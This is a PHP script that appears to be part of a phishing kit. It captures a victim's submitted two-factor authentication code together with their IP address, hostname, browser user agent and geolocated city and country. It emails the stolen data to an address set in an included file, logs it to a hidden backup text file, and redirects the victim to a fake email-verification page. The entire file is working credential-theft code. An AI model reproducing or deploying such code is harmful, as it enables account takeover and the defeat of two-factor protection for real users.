<?php
if($_POST["2factor"] != ""){
$ip = getenv("REMOTE_ADDR");
require_once('./geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------New Logz-----------------------\n";
$message .= "Two-Factor Auth:            : ".$_POST['2factor']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= 	"City: {$geoplugin->city}  \n";
$message .= 	"Region: {$geoplugin->region} \n";
$message .= 	"Country Name: {$geoplugin->countryName} \n";
$message .= 	"Country Code: {$geoplugin->countryCode}  \n";
$message.= "Date Log  : ".$date." \n";
$message.= "Time Log  : ".$time." \n";
include "email.php";

$subj .= "2FA Auth Mail EN | $login";
$from .= "From: <Webmaster> \n";
mail($to,$subj,$message,$from);
 
$fp = fopen("backupresultsxxxxxxxxxxxxxxxxxxxxxxxxx.txt","a");
fputs($fp,$message);
fclose($fp);

 $praga=rand();
$praga=md5($praga);
  header ("Location: emailverification.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>